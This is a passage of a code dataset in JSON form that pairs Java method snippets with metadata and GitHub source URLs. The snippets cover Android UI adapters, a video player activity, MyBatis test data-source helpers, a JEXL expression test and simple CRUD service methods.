["public"]}}, {"method_name": "onCreateViewHolder", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ViewHolder", "snippet": "    public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {        return new ViewHolder();    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/PhotoAdapter.java", "stars": "1", "class": {"name": "PhotoAdapter", "extends": "MyAdapter", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "generateDefaultLayoutManager", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "RecyclerView", "snippet": "    protected RecyclerView.LayoutManager generateDefaultLayoutManager(Context context) {        return new GridLayoutManager(context, 3);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/PhotoAdapter.java", "stars": "1", "class": {"name": "PhotoAdapter", "extends": "MyAdapter", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "onBindView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onBindView(int position) {            GlideApp.with(getContext())                    .load(getItem(position))                    .into(mImageView);            mCheckBox.setChecked(mSelectPhoto.contains(getItem(position)));        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/PhotoAdapter.java", "stars": "1", "class": {"name": "ViewHolder", "extends": "MyAdapter", "implements": null, "modifiers": ["final"]}}, {"method_name": "testExpress", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testExpress() throws Exception {        try {            long nowtime = DateTimeUtils.currentTimeMillis();            Map<String, Object> map = new HashMap<String, Object>(16);            System.out.println(nowtime);            map.put(\"nextCheckTime\", \"1576490100000\");            String expression = \"nextCheckTime < \" + nowtime;            Object code = convertToCode(expression, map);            System.out.println((Boolean) code);        } catch (Exception e) {            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/test/java/azkaban/db/ExpressionTest.java", "stars": "18", "class": {"name": "ExpressionTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "convertToCode", "params": ["String", "Map<String,Object>"], "throws": null, "modifiers": ["public", "static"], "return_type": "Object", "snippet": "    public static Object convertToCode(String jexlExp, Map<String, Object> map) {        JexlEngine jexl = new JexlEngine();        Expression e = jexl.createExpression(jexlExp);        JexlContext jc = new MapContext();        for (String key : map.keySet()) {            jc.set(key, map.get(key));        }        if (null == e.evaluate(jc)) {            return \"\";        }        return e.evaluate(jc);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/test/java/azkaban/db/ExpressionTest.java", "stars": "18", "class": {"name": "ExpressionTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testprocess", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testprocess() throws Exception {        TT tt = new TT();        new Thread(tt).start();        while(true && (str = str1) != null){            System.out.println(str);        }        System.out.println(\"complete\");    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/test/java/azkaban/db/ExpressionTest.java", "stars": "18", "class": {"name": "ExpressionTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void run() {            for (int i = 0;i <=10 ;i++){                try {                    Thread.sleep(30000);                } catch (InterruptedException e) {                    e.printStackTrace();                }                str1 = \"\";            }        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/test/java/azkaban/db/ExpressionTest.java", "stars": "18", "class": {"name": "TT", "extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "intercept", "params": ["Chain"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Response", "snippet": "    public Response intercept(Chain chain) throws IOException {        // \u8ffd\u52a0\u8bbe\u7f6eheader\u4fe1\u606f        final Request originalRequest = chain.request();        if (originalRequest.body() == null || originalRequest.header(\"Content-Encoding\") != null) {            return chain.proceed(originalRequest);        }        final String token = CallKit.getInstance().getToken();        Request request = originalRequest                .newBuilder()                .addHeader(\"token\", TextUtils.isEmpty(token) ? \"\" : token)                .addHeader(\"domain\", CallKit.getInstance().getBaseUrl())                .addHeader(\"timestamp\", String.valueOf(System.currentTimeMillis()))                .build();        return chain.proceed(request);    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/interceptor/HeaderInterceptor.java", "stars": "1", "class": {"name": "HeaderInterceptor", "extends": null, "implements": ["Interceptor"], "modifiers": ["public"]}}, {"method_name": "createUnpooledDataSource", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "UnpooledDataSource", "snippet": "  public static UnpooledDataSource createUnpooledDataSource(String resource) throws IOException {    Properties props = Resources.getResourceAsProperties(resource);    UnpooledDataSource ds = new UnpooledDataSource();    ds.setDriver(props.getProperty(\"driver\"));    ds.setUrl(props.getProperty(\"url\"));    ds.setUsername(props.getProperty(\"username\"));    ds.setPassword(props.getProperty(\"password\"));    return ds;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/BaseDataTest.java", "stars": "15", "class": {"name": "BaseDataTest", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "createPooledDataSource", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "PooledDataSource", "snippet": "  public static PooledDataSource createPooledDataSource(String resource) throws IOException {    Properties props = Resources.getResourceAsProperties(resource);    PooledDataSource ds = new PooledDataSource();    ds.setDriver(props.getProperty(\"driver\"));    ds.setUrl(props.getProperty(\"url\"));    ds.setUsername(props.getProperty(\"username\"));    ds.setPassword(props.getProperty(\"password\"));    return ds;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/BaseDataTest.java", "stars": "15", "class": {"name": "BaseDataTest", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "runScript", "params": ["DataSource", "String"], "throws": ["IOException", "SQLException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void runScript(DataSource ds, String resource) throws IOException, SQLException {    try (Connection connection = ds.getConnection()) {      ScriptRunner runner = new ScriptRunner(connection);      runner.setAutoCommit(true);      runner.setStopOnError(false);      runner.setLogWriter(null);      runner.setErrorLogWriter(null);      runScript(runner, resource);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/BaseDataTest.java", "stars": "15", "class": {"name": "BaseDataTest", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "runScript", "params": ["ScriptRunner", "String"], "throws": ["IOException", "SQLException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void runScript(ScriptRunner runner, String resource) throws IOException, SQLException {    try (Reader reader = Resources.getResourceAsReader(resource)) {      runner.runScript(reader);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/BaseDataTest.java", "stars": "15", "class": {"name": "BaseDataTest", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "createBlogDataSource", "params": [], "throws": ["IOException", "SQLException"], "modifiers": ["public", "static"], "return_type": "DataSource", "snippet": "  public static DataSource createBlogDataSource() throws IOException, SQLException {    DataSource ds = createUnpooledDataSource(BLOG_PROPERTIES);    runScript(ds, BLOG_DDL);    runScript(ds, BLOG_DATA);    return ds;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/BaseDataTest.java", "stars": "15", "class": {"name": "BaseDataTest", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "createJPetstoreDataSource", "params": [], "throws": ["IOException", "SQLException"], "modifiers": ["public", "static"], "return_type": "DataSource", "snippet": "  public static DataSource createJPetstoreDataSource() throws IOException, SQLException {    DataSource ds = createUnpooledDataSource(JPETSTORE_PROPERTIES);    runScript(ds, JPETSTORE_DDL);    runScript(ds, JPETSTORE_DATA);    return ds;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/BaseDataTest.java", "stars": "15", "class": {"name": "BaseDataTest", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\tint n;\t\tScanner sc = new Scanner(System.in);\t\tSystem.out.println(\"enter no of rows:\");\t\tn = sc.nextInt();\t\tfor(int i = 1;i <= n; i++) {\t\t\tfor(int j = 1 ;j <= n-i+1 ; j++) {\t\t\t\tSystem.out.print(\"*\");\t\t\t}\t\t\tSystem.out.print(\"\\n\");\t\t}\t\tsc.close();\t}", "url": "https://raw.githubusercontent.com/likith22/java-programs/master/ReverseRightTriangle.java", "stars": "3", "class": {"name": "ReverseRightTriangle", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLeft", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getLeft() {\t\treturn left;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmBinary.java", "stars": "3", "class": {"name": "StmBinary", "extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getRight", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stm", "snippet": "\tpublic Stm getRight() {\t\treturn right;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmBinary.java", "stars": "3", "class": {"name": "StmBinary", "extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "indent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void indent() {\t\tif (left != null) {\t\t\tleft.setIndent(getIndent());\t\t\tleft.indent();\t\t}\t\tif (right != null) {\t\t\tright.setIndent(getIndent());\t\t\tright.indent();\t\t}\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/StmBinary.java", "stars": "3", "class": {"name": "StmBinary", "extends": "Stm", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "salvar", "params": ["Cliente"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void salvar(Cliente cliente) {        clienteDao.salvar(cliente);    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/service/ClienteServiceImpl.java", "stars": "2", "class": {"name": "ClienteServiceImpl", "extends": null, "implements": ["ClienteService"], "modifiers": ["public"]}}, {"method_name": "recuperar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Cliente>", "snippet": "    public List<Cliente> recuperar() {        return clienteDao.recuperar();    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/service/ClienteServiceImpl.java", "stars": "2", "class": {"name": "ClienteServiceImpl", "extends": null, "implements": ["ClienteService"], "modifiers": ["public"]}}, {"method_name": "recuperarPorId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Cliente", "snippet": "    public Cliente recuperarPorId(Integer clienteId) {        return clienteDao.recuperarPorId(clienteId);    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/service/ClienteServiceImpl.java", "stars": "2", "class": {"name": "ClienteServiceImpl", "extends": null, "implements": ["ClienteService"], "modifiers": ["public"]}}, {"method_name": "atualizar", "params": ["Cliente"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void atualizar(Cliente cliente) {        clienteDao.atualizar(cliente);    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/service/ClienteServiceImpl.java", "stars": "2", "class": {"name": "ClienteServiceImpl", "extends": null, "implements": ["ClienteService"], "modifiers": ["public"]}}, {"method_name": "excluir", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void excluir(Integer clienteId) {        clienteDao.excluir(clienteId);    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/service/ClienteServiceImpl.java", "stars": "2", "class": {"name": "ClienteServiceImpl", "extends": null, "implements": ["ClienteService"], "modifiers": ["public"]}}, {"method_name": "getTransformerName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTransformerName() {        return transformerName;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/transformer/ComplexTransformer.java", "stars": "23", "class": {"name": "ComplexTransformer", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setTransformerName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTransformerName(String transformerName) {        this.transformerName = transformerName;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/transformer/ComplexTransformer.java", "stars": "23", "class": {"name": "ComplexTransformer", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "evaluate", "params": ["Record", "Map<String,Object>", "Object"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Record", "snippet": "    abstract public Record evaluate(Record record, Map<String, Object> tContext, Object... paras);}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/transformer/ComplexTransformer.java", "stars": "23", "class": {"name": "ComplexTransformer", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getSql", "params": ["Configuration", "SqlNode"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String getSql(Configuration configuration, SqlNode rootSqlNode) {    DynamicContext context = new DynamicContext(configuration, null);    rootSqlNode.apply(context);    return context.getSql();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/defaults/RawSqlSource.java", "stars": "15", "class": {"name": "RawSqlSource", "extends": null, "implements": ["SqlSource"], "modifiers": ["public"]}}, {"method_name": "getBoundSql", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "BoundSql", "snippet": "  public BoundSql getBoundSql(Object parameterObject) {    return sqlSource.getBoundSql(parameterObject);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/defaults/RawSqlSource.java", "stars": "15", "class": {"name": "RawSqlSource", "extends": null, "implements": ["SqlSource"], "modifiers": ["public"]}}, {"method_name": "getSql", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSql(){    return sqlSource.getSql();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/defaults/RawSqlSource.java", "stars": "15", "class": {"name": "RawSqlSource", "extends": null, "implements": ["SqlSource"], "modifiers": ["public"]}}, {"method_name": "onCancel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onCancel ()\t{\t\tn_onCancel ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/os/CancellationSignal_OnCancelListenerImplementor.java", "stars": "2", "class": {"name": "CancellationSignal_OnCancelListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onCancel", "params": [], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onCancel ();\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/os/CancellationSignal_OnCancelListenerImplementor.java", "stars": "2", "class": {"name": "CancellationSignal_OnCancelListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/os/CancellationSignal_OnCancelListenerImplementor.java", "stars": "2", "class": {"name": "CancellationSignal_OnCancelListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/os/CancellationSignal_OnCancelListenerImplementor.java", "stars": "2", "class": {"name": "CancellationSignal_OnCancelListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_simple_play);        init();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/simple/SimplePlayer.java", "stars": "2", "class": {"name": "SimplePlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init() {        videoPlayer =  (StandardGSYVideoPlayer)findViewById(R.id.video_player);        String source1 = \"http://9890.vod.myqcloud.com/9890_4e292f9a3dd011e6b4078980237cc3d3.f20.mp4\";        videoPlayer.setUp(source1, true, \"\u6d4b\u8bd5\u89c6\u9891\");        //\u589e\u52a0\u5c01\u9762        ImageView imageView = new ImageView(this);        imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);        imageView.setImageResource(R.mipmap.xxx1);        videoPlayer.setThumbImageView(imageView);        //\u589e\u52a0title        videoPlayer.getTitleTextView().setVisibility(View.VISIBLE);        //\u8bbe\u7f6e\u8fd4\u56de\u952e        videoPlayer.getBackButton().setVisibility(View.VISIBLE);        //\u8bbe\u7f6e\u65cb\u8f6c        orientationUtils = new OrientationUtils(this, videoPlayer);        //\u8bbe\u7f6e\u5168\u5c4f\u6309\u952e\u529f\u80fd,\u8fd9\u662f\u4f7f\u7528\u7684\u662f\u9009\u62e9\u5c4f\u5e55\uff0c\u800c\u4e0d\u662f\u5168\u5c4f        videoPlayer.getFullscreenButton().setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                orientationUtils.resolveByClick();            }        });        //\u662f\u5426\u53ef\u4ee5\u6ed1\u52a8\u8c03\u6574        videoPlayer.setIsTouchWiget(true);        //\u8bbe\u7f6e\u8fd4\u56de\u6309\u952e\u529f\u80fd        videoPlayer.getBackButton().setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                onBackPressed();            }        });        videoPlayer.startPlayLogic();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/simple/SimplePlayer.java", "stars": "2", "class": {"name": "SimplePlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onPause", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPause() {        super.onPause();        videoPlayer.onVideoPause();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/simple/SimplePlayer.java", "stars": "2", "class": {"name": "SimplePlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onResume", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onResume() {        super.onResume();        videoPlayer.onVideoResume();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/simple/SimplePlayer.java", "stars": "2", "class": {"name": "SimplePlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDestroy", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDestroy() {        super.onDestroy();        GSYVideoManager.releaseAllVideos();        if (orientationUtils != null)            orientationUtils.releaseListener();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/simple/SimplePlayer.java", "stars": "2", "class": {"name": "SimplePlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBackPressed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {        //\u5148\u8fd4\u56de\u6b63\u5e38\u72b6\u6001        if (orientationUtils.getScreenType() == ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE) {            videoPlayer.getFullscreenButton().performClick();            return;        }        //\u91ca\u653e\u6240\u6709        videoPlayer.setVideoAllCallBack(null);        super.onBackPressed();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/simple/SimplePlayer.java", "stars": "2", "class": {"name": "SimplePlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "method", "params": ["String", "Consumer<String>", "Consumer<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void method(String s, Consumer<String> con1 ,Consumer<String> con2){        //con1.accept(s);        //con2.accept(s);        //\u4f7f\u7528andThen\u65b9\u6cd5,\u628a\u4e24\u4e2aConsumer\u63a5\u53e3\u8fde\u63a5\u5230\u4e00\u8d77,\u5728\u6d88\u8d39\u6570\u636e        con1.andThen(con2).accept(s);//con1\u8fde\u63a5con2,\u5148\u6267\u884ccon1\u6d88\u8d39\u6570\u636e,\u5728\u6267\u884ccon2\u6d88\u8d39\u6570\u636e    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo05/Consumer/Demo02AndThen.java", "stars": "2", "class": {"name": "Demo02AndThen", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        //\u8c03\u7528method\u65b9\u6cd5,\u4f20\u9012\u4e00\u4e2a\u5b57\u7b26\u4e32,\u4e24\u4e2aLambda\u8868\u8fbe\u5f0f        method(\"Hello\",                (t)->{                    //\u6d88\u8d39\u65b9\u5f0f:\u628a\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5927\u5199\u8f93\u51fa                    System.out.println(t.toUpperCase());                },                (t)->{                    //\u6d88\u8d39\u65b9\u5f0f:\u628a\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5c0f\u5199\u8f93\u51fa                    System.out.println(t.toLowerCase());                });    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo05/Consumer/Demo02AndThen.java", "stars": "2", "class": {"name": "Demo02AndThen", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onSurfaceAvailable", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceAvailable(Surface surface) {        pauseLogic(surface, (mTextureView != null && mTextureView.getShowView() instanceof TextureView));    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "onSurfaceSizeChanged", "params": ["Surface", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceSizeChanged(Surface surface, int width, int height) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "onSurfaceDestroyed", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onSurfaceDestroyed(Surface surface) {        //\u6e05\u7a7a\u91ca\u653e        setDisplay(null);        //\u540c\u4e00\u6d88\u606f\u961f\u5217\u4e2d\u53bbrelease        releaseSurface(surface);        return true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "onSurfaceUpdated", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceUpdated(Surface surface) {        //\u5982\u679c\u64ad\u653e\u7684\u662f\u6682\u505c\u5168\u5c4f\u4e86        releasePauseCover();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "pauseLogic", "params": ["Surface", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void pauseLogic(Surface surface, boolean pauseLogic) {        mSurface = surface;        if (pauseLogic)            //\u663e\u793a\u6682\u505c\u5207\u6362\u663e\u793a\u7684\u56fe\u7247            showPauseCover();        setDisplay(mSurface);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "addTextureView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void addTextureView() {        mTextureView = new GSYRenderView();        mTextureView.addView(getContext(), mTextureViewContainer, mRotate, this, this, mEffectFilter, mMatrixGL, mRenderer, mMode);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "getTextureParams", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getTextureParams() {        boolean typeChanged = (GSYVideoType.getShowType() != GSYVideoType.SCREEN_TYPE_DEFAULT);        return (typeChanged) ? ViewGroup.LayoutParams.WRAP_CONTENT : ViewGroup.LayoutParams.MATCH_PARENT;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "changeTextureViewShowType", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void changeTextureViewShowType() {        if (mTextureView != null) {            int params = getTextureParams();            ViewGroup.LayoutParams layoutParams = mTextureView.getLayoutParams();            layoutParams.width = params;            layoutParams.height = params;            mTextureView.setLayoutParams(layoutParams);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYTextureRenderView.java", "stars": "2", "class": {"name": "GSYTextureRenderView", "extends": "FrameLayout", "implements": ["IGSYSurfaceListener", "MeasureHelper"], "modifiers": ["public", "abstract"]}}, {"method_name": "initCover", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initCover() {        